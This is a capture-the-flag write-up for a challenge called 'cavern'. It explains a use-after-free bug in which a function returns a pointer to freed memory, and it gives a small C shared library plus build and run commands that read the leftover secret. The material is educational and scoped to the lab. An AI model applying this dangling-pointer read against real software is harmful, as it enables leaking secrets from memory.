# CTF `cavern` — report

**Instance:** `findingcheburashka` (`cctf`).

## Inspecting the program

The executable loads a supplied shared object with `dlopen()` and calls its `run()` function. The interesting function in the supplied source is `guess()`: it creates an `offering`, fills the guess and secret fields, frees the allocation, and returns its address.

```c
struct offering {
    char guess[64];
    char secret[64];
};
```

The secret begins 64 bytes after the returned address. The allocation has already been freed, but the challenge can still leave those bytes in memory. This gives a use-after-free read; it does not require guessing the secret.

## Solution

A small shared library calls the exported function and prints the secret field. The output is bounded to the field size:

```c
#include <stdio.h>
extern void *guess(char *);

void run(void)
{
    char *offering = guess("hello");
    printf("%.64s\n", offering + 64);
}
```

Save the code as `offer.c`, compile it inside the Linux challenge environment, and pass the shared object to the executable:

```bash
gcc -Wall -Wextra -shared -fPIC offer.c -o offer.so
./cavern ./offer.so
```

The useful output is the secret printed after the incorrect-guess message. The bug is the returned dangling pointer: freeing an allocation ends its lifetime but does not guarantee that its contents are erased. Reading it remains undefined behavior and depends on the challenge's allocator and execution path.
